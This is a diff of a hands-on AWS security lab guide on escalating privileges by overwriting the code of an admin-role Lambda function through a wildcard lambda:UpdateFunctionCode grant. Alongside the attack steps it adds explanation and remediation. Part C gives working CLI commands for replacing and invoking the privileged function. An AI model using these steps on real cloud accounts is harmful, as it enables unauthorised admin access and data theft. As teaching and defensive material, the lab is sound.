@@ -6,17 +6,23 @@
 **Starting Identity:** `iamws-lambda-developer-user`
 **Target:** Crown jewels via hijacking `iamws-privileged-lambda` (execution role: `iamws-privileged-lambda-role` with `AdministratorAccess`)
 
-**The Vulnerability:** `iamws-lambda-developer-user` can update the code of ANY Lambda function — including `iamws-privileged-lambda`, which runs with a dangerously permissive IAM role with `AdministratorAccess` permissions. By replacing the function code with a malicious payload, the developer's code executes with `AdministratorAccess` permissions in AWS via the lambda function.
+**The Vulnerability:** 
+- Lambda functions are serverless compute functions that run code when invoked
+- Lambda functions use attached **execution roles** to make AWS api calls to other AWS services
+- In our scenario, `iamws-lambda-developer-user` can update the code of ANY Lambda function — including a function called `iamws-privileged-lambda`, which runs with a dangerously permissive execution role with `AdministratorAccess` permissions.
+- By replacing the function code with a malicious payload, the developer's code executes with `AdministratorAccess` permissions in AWS via the lambda function.
 
-**Real-world scenario:** A developer has `lambda:UpdateFunctionCode` scoped to `Resource: "*"` — the kind of overly-broad policy that came out of ChatGPT a couple years ago and never got tightened. Every Lambda in the account runs with its own execution role attached, and some of those roles are far more privileged than the developer's own permissions — an admin-tier automation Lambda, a secrets rotator, a backup job. Overwriting the code of one of those functions lets the developer's code run with that function's role, turning a wildcard write permission on Lambda into whatever the most-privileged Lambda in the account can do.
+### A note on the identities you'll switch between
+
+This lab involves three identities.
+
+| Identity | What it is | When you use it |
+| --- | --- | --- |
+| `iamws-lambda-developer-user` | The attacker. A developer who can overwrite the code of any Lambda function. | Parts A, C & E: recon, the exploit, and the re-test |
+| `iamws-privileged-lambda-role` | The admin-tier execution role attached to the target Lambda. | Not a profile you switch to — your injected code runs *as* this role when the function executes |
+| `iamws-lab-default` | Your admin identity (acting as the defender). | Part D: the defense, and refreshing the recon graph |
 
 ### Part A: Identify with iam-recon
-
-Build or refresh your iam-recon graph:
-
-```bash
-iam-recon graph create --profile iamws-lab-default
-```
 
 Run the pathfinding scan scoped to this scenario's principal:
 
@@ -52,8 +58,6 @@ Expected output:
 ```
 ALLOW user/iamws-lambda-developer-user can call lambda:UpdateFunctionCode with *
 ```
-
-**In the interactive visualization:** search for `lambda-developer-user`. The node is **blue** (not orange) because no edge checker flagged it. The `iamws-privileged-lambda-role` is red (Admin). There's no edge between them in the graph — but pathfinding's output shows the path exists.
 
 ### Part B: Understand the Attack
 
@@ -101,7 +105,7 @@ aws lambda get-function --function-name iamws-privileged-lambda \
   --profile iamws-lambda-developer-user
 ```
 
-**Step 4: Save the original code hash**
+**Step 4: Save the hash for the original code the Lambda is currently configured with**
 
 ```bash
 ORIGINAL_HASH=$(aws lambda get-function --function-name iamws-privileged-lambda \
@@ -110,7 +114,13 @@ ORIGINAL_HASH=$(aws lambda get-function --function-name iamws-privileged-lambda 
 echo "Original hash: $ORIGINAL_HASH"
 ```
 
-**Step 5: Write the malicious handler**
+Expected output is similar to the following:
+
+```
+Original hash: UICXkyne1cumrq6E1GRqIafrb4NjgQ4Z7fULur/ZRPM=
+```
+
+**Step 5: Write the malicious code you will inject into the Lambda function**
 
 ```bash
 mkdir -p /tmp/iamws-exploit
@@ -136,7 +146,7 @@ PYEOF
 cd /tmp/iamws-exploit && zip -j exploit.zip lambda_function.py && cd -
 ```
 
-**Step 7: Overwrite the function code**
+**Step 7: Replace the function code with your new malicious version**
 
 ```bash
 aws lambda update-function-code \
@@ -147,7 +157,9 @@ aws lambda update-function-code \
 
 No error — the developer updated the function code.
 
-**Step 8: Invoke the function**
+**Step 8: Invoke the Lambda function to run the code**
+
+This command will invoke the Lambda function, and save its response to `/tmp/iamws-exploit/response.json`
 
 ```bash
 aws lambda invoke --function-name iamws-privileged-lambda \
@@ -172,13 +184,13 @@ Expected output:
 }
 ```
 
-The Lambda ran as `iamws-privileged-lambda-role` — the developer never directly assumed the role, but their code executed as `AdministratorAccess`.
+The Lambda ran as `iamws-privileged-lambda-role` — the developer never directly assumed the role, but the malicious code executed as `AdministratorAccess` and was able to talk to S3 and return the S3 object contents in the Lambda function response.
 
 ### Part D: Apply the Defense
 
-Run all defense steps as your admin identity.
+You will run all defense steps as your admin identity.
 
-**Step 1: Apply a scoped inline policy**
+**Step 1: Apply a scoped inline policy to the developer user**
 
 ```bash
 ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
@@ -205,9 +217,9 @@ aws iam put-user-policy \
   }'
 ```
 
-The fix is one statement: `Resource: "*"` → `Resource: "arn:aws:lambda:*:ACCOUNT:function:dev-*"`. The developer can still update dev functions; privileged functions like `iamws-privileged-lambda` are out of scope.
+The important update is: `Resource: "*"` → `Resource: "arn:aws:lambda:*:ACCOUNT:function:dev-*"`. The developer can still update functions in a certain namespace; privileged functions like `iamws-privileged-lambda` are out of scope. (Note that this is just an example, it would still be easy to escalate privileges if, for example, the developer has permissions to create new a lambda function with a name matching the namespace).
 
-**Step 2: Detach the overly-permissive managed policy**
+**Step 2: Detach the overly-permissive original policy**
 
 ```bash
 aws iam detach-user-policy \
@@ -219,13 +231,9 @@ aws iam detach-user-policy \
 
 Wait a short amount of time for the IAM changes to propagate. 
 
-```bash
-sleep 60
-```
-
 ### Part E: Verify the Remediation
 
-**Step 1: Create a dummy payload**
+**Step 1: Create a dummy payload (representing more malicious code)**
 
 ```bash
 echo "def handler(e,c): pass" > /tmp/dummy_lambda.py
@@ -283,14 +291,8 @@ Expected output:
 DENY user/iamws-lambda-developer-user cannot call lambda:UpdateFunctionCode with arn:aws:lambda:*:767397689800:function:iamws-privileged-lambda
 ```
 
-> [!NOTE]
-> When using `argquery --resource` with Lambda ARNs, include the account ID explicitly (`arn:aws:lambda:*:ACCOUNT_ID:function:name`). With `*` for the account component, iam-recon's wildcard matcher may return DENY even for allowed resources.
-
-**In the interactive visualization:** search for `lambda-developer-user`. The node remains blue (no edge checker for this attack family), but the `IDENTITY` panel now shows `SecureLambdaDeveloper`. The `iamws-privileged-lambda-role` node is still red, and there is still no edge between user and role — the graph never showed this attack.
-
 ### What You Learned
 
 - `lambda:UpdateFunctionCode` with `Resource: "*"` allows hijacking any Lambda function. The attack path never requires `iam:PassRole` — you update existing compute that already has a privileged role attached.
-- **Resource constraints** (`dev-*` ARN pattern) are the fix. The naming convention between dev and privileged functions becomes the security boundary.
+- **Resource constraints** (`dev-*` ARN pattern) allow you to scope policies using certain namespaces. (This is not a foolproof best practice, just a conceptual example)
 - AWS IAM has a short-lived permission cache (~3–5 minutes) for Lambda — wait before verifying live, or use `simulate-principal-policy` for immediate offline confirmation.
-- iam-recon's `argquery --preset privesc` does not catch this attack family. Pathfinding is the correct discovery and verification surface.
